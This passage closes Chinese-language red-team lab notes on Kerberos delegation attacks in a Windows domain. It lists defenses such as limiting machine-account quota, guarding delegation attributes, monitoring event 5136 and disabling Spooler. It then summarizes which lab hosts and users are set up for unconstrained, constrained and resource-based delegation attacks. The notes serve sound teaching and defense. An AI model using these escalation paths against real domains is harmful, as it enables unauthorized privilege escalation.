  • 限制机器账号创建：降低 ms-DS-MachineAccountQuota 的值（默认为10），防止普通用户随意添加计算机。
  • 保护高价值计算机：对域控等关键机器，严格控制其 msDS-AllowedToActOnBehalfOfOtherIdentity 属性的修改权限，仅允许域管理员修改。
  • 监控异常 LDAP 修改：关注事件 ID 5136（目录服务对象被修改），特别是对 msDS-AllowedToActOnBehalfOfOtherIdentity 的更改。
  • 禁用不必要的打印机服务：对于非打印服务器，关闭 Print Spooler 服务以防止打印机漏洞。
  • 启用 Protected Users 组或设置“账户敏感且不能被委派”，防止高权限用户的凭据被滥用。
  • 实施最小权限原则：定期审计域内用户的权限，特别是对计算机对象的写权限。
  • 将域控制器等关键机器加入“受保护的用户”组，或设置“账户敏感且不能被委派”属性，以防止机器账户被用于委派攻击。

十二、总结

本笔记详细记录了 REDTEAM 域的当前环境，并深入讲解了 Kerberos 票据权限层级、SPN 与服务类型基础、非约束委派攻击（含结合 Spooler 漏洞）、约束委派攻击以及基于资源的约束委派攻击（含两个复现案例）。通过对委派机制的设计初衷、工作原理、攻击流程和防御措施的剖析，可以清晰地理解这些攻击在域环境中的利用方式和防护要点。

实验环境中，12server1、12server2 配置了非约束委派，用户 web 配置了非约束委派，用户 websec 配置了约束委派，而普通用户 hack 可用于基于资源的约束委派攻击。这些配置为攻击者提供了多种提权路径，也凸显了正确配置委派和及时防御的重要性。掌握这些攻击手法，有助于提升对 Windows 域安全的认知，并有效进行渗透测试与防御部署。
